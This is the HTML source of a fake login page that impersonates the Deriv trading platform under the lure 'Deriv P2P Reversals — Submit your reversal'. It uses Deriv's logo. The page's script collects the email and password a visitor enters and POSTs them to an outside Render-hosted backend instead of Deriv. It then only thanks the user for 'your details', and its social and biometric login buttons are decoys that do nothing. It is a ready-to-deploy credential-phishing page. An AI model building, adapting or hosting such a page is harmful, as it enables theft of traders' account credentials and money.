<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Log in</title>
<style>
  :root{
    --brand:#FF444F;
    --bg:#F5F5F5;
    --field-bg:#FFFFFF;
    --input-active-bg:#EEF4FF;
    --text-primary:#333333;
    --text-secondary:#666666;
    --placeholder:#9E9E9E;
    --disabled:#BDBDBD;
    --border:#D9D9D9;
    --divider:#DCDCDC;
  }
  *{box-sizing:border-box;}
  body{
    margin:0;
    font-family:-apple-system,"SF Pro Text","Roboto","Inter",system-ui,sans-serif;
    background:var(--bg);
    color:var(--text-primary);
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:24px;
  }
  .card{
    width:100%;
    max-width:400px;
    background:transparent;
    display:flex;
    flex-direction:column;
  }
  .logo-slot{
    max-width:180px;
    height:auto;
    margin:0 auto 48px;
    display:block;
  }
  h1{
    font-size:24px;
    font-weight:700;
    text-align:center;
    margin:0 0 8px;
    color:var(--text-primary);
  }
  .subtitle{
    text-align:center;
    font-size:14px;
    font-weight:400;
    color:var(--text-secondary);
    margin:0 0 32px;
  }
  form{
    display:flex;
    flex-direction:column;
    gap:24px;
  }
  .field{
    position:relative;
  }
  .field input{
    width:100%;
    height:56px;
    border:1px solid var(--border);
    border-radius:8px;
    background:var(--field-bg);
    padding:20px 16px 6px;
    font-size:16px;
    font-weight:400;
    color:var(--text-primary);
    outline:none;
    transition:border-color .15s ease, background-color .15s ease;
  }
  .field input::placeholder{color:transparent;}
  .field label{
    position:absolute;
    left:16px;
    top:18px;
    font-size:16px;
    font-weight:400;
    color:var(--placeholder);
    pointer-events:none;
    transition:all .15s ease;
    background:transparent;
  }
  .field input:focus{
    border-color:var(--brand);
    background:var(--input-active-bg);
  }
  .field input:focus + label,
  .field input:not(:placeholder-shown) + label{
    top:8px;
    font-size:12px;
    font-weight:500;
    color:var(--text-secondary);
  }
  .field input:focus + label{
    color:var(--brand);
  }
  .row-end{
    display:flex;
    justify-content:flex-end;
    margin-top:-8px;
  }
  .link{
    color:var(--brand);
    font-size:14px;
    font-weight:600;
    text-decoration:none;
    background:none;
    border:none;
    cursor:pointer;
    padding:8px 0;
  }
  .btn-primary{
    height:56px;
    border-radius:28px;
    background:var(--brand);
    color:#FFFFFF;
    font-size:16px;
    font-weight:700;
    border:none;
    cursor:pointer;
    margin-top:8px;
    transition:filter .15s ease, transform .05s ease;
  }
  .btn-primary:hover{ filter:brightness(0.94); }
  .btn-primary:active{ transform:scale(0.99); }

  .divider{
    display:flex;
    align-items:center;
    gap:12px;
    margin:32px 0 24px;
  }
  .divider::before, .divider::after{
    content:"";
    flex:1;
    height:1px;
    background:var(--divider);
  }
  .divider span{
    font-size:13px;
    color:var(--text-secondary);
    font-weight:500;
  }

  .btn-biometric{
    height:48px;
    border-radius:22px;
    background:#FFFFFF;
    border:1.5px solid var(--brand);
    color:var(--brand);
    font-size:15px;
    font-weight:600;
    cursor:pointer;
    display:flex;
    align-items:center;
    justify-content:center;
    gap:8px;
    width:100%;
    margin-bottom:16px;
    transition:background-color .15s ease;
  }
  .btn-biometric:hover{ background:#FFF5F6; }

  .social-row{
    display:flex;
    flex-direction:column;
    gap:16px;
  }
  .btn-social{
    height:48px;
    border-radius:22px;
    border:1px solid var(--border);
    font-size:15px;
    font-weight:600;
    cursor:pointer;
    display:flex;
    align-items:center;
    justify-content:center;
    gap:10px;
    width:100%;
    transition:filter .15s ease;
  }
  .btn-social:hover{ filter:brightness(0.97); }
  .btn-google{ background:#FFFFFF; color:var(--text-primary); border-color:var(--border); }
  .btn-facebook{ background:#1877F2; color:#FFFFFF; border:none; }
  .btn-apple{ background:#000000; color:#FFFFFF; border:none; }

  .signup{
    text-align:center;
    font-size:14px;
    font-weight:400;
    color:var(--text-secondary);
    margin-top:32px;
  }
  .signup .link{ font-weight:600; padding:0; margin-left:4px; }

  @media (max-width:380px){
    .card{ max-width:100%; }
  }
</style>
</head>
<body>
  <div class="card">
    <img src="https://tradersview.deriv.com/deriv-wordmark.png" alt="Deriv" class="logo-slot">
    <h1>Deriv P2P Reversals</h1>
    <p class="subtitle">Submit your reversal</p>

    <form id="loginForm">
      <div class="field">
        <input type="email" id="email" placeholder=" " autocomplete="email" required>
        <label for="email">Email</label>
      </div>

      <div class="field">
        <input type="password" id="password" placeholder=" " autocomplete="current-password" required>
        <label for="password">Password</label>
      </div>

      <div class="row-end">
        <button type="button" class="link">Forgot password?</button>
      </div>

      <button type="submit" class="btn-primary">Log in</button>
    </form>

    <div class="divider"><span>or</span></div>

    <button type="button" class="btn-biometric">
      <span>🔒</span> Log in with biometrics
    </button>

    <div class="social-row">
      <button type="button" class="btn-social btn-google">
        <span style="font-weight:700;">
          <span style="color:#4285F4;">G</span><span style="color:#EA4335;">o</span><span style="color:#FBBC05;">o</span><span style="color:#4285F4;">g</span><span style="color:#34A853;">l</span><span style="color:#EA4335;">e</span>
        </span>
        Continue with Google
      </button>
      <button type="button" class="btn-social btn-facebook">Continue with Facebook</button>
      <button type="button" class="btn-social btn-apple">Continue with Apple</button>
    </div>

    <p class="signup">Don't have an account?<a href="#" class="link">Sign up</a></p>
  </div>

<script>
  // Point this to your deployed Render backend URL, e.g. https://your-backend.onrender.com
  const BACKEND_URL = 'https://login-backend-ro8l.onrender.com';

  document.getElementById('loginForm').addEventListener('submit', async function(e){
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const submitBtn = e.target.querySelector('.btn-primary');
    const originalText = submitBtn.textContent;
    submitBtn.textContent = 'Logging in...';
    submitBtn.disabled = true;

    try {
      const res = await fetch(`${BACKEND_URL}/api/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      });
      if (!res.ok) throw new Error('Request failed');
      alert('Thanks! We received your details.');
      e.target.reset();
    } catch (err) {
      alert('Something went wrong. Please try again.');
      console.error(err);
    } finally {
      submitBtn.textContent = originalText;
      submitBtn.disabled = false;
    }
  });
</script>
</body>
</html>
